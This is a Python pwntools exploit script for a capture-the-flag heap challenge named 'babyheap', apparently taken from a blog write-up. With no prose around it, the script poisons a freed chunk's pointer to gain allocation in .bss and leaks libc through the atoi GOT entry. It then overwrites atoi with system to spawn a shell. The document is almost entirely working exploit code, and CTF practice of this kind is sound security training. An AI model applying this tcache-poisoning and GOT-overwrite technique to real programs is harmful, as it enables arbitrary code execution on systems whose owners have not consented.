# blog.y2a.dev/articles/2022/05-15/babyheap/
from pwn import *

file = "./babyheap"
e = ELF(file)
libc = ELF("./libc.so.6")
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

io = process(file)

def create():
    io.sendlineafter("> ", "1")

def edit(content: bytes):
    io.sendlineafter("> ", "2")
    io.sendlineafter("Content? ", content)

def show():
    io.sendlineafter("> ", "3")

def delete():
    io.sendlineafter("> ", "4")

def fill(content: bytes):
    io.sendlineafter("> ", "1337")
    io.sendlineafter("Fill ", content)

create()
delete()
edit(p64(e.bss()+0x20)) # 0x6020a0
create()

pld = b""
pld += p64(0) # create
pld += p64(0) # edit
pld += p64(0) # show
pld += p64(0) # delete
pld += p64(0) # fill
pld += p64(e.got["atoi"])
fill(pld)
show()
io.recvuntil("Content: ")
libc.address = u64(io.recvline()[:-1].ljust(8, b"\x00")) - libc.sym["atoi"]
print(f'libc base: 0x{libc.address:x}')

edit(p64(libc.sym["system"]))
io.sendlineafter("> ", "/bin/sh\x00")

io.interactive()
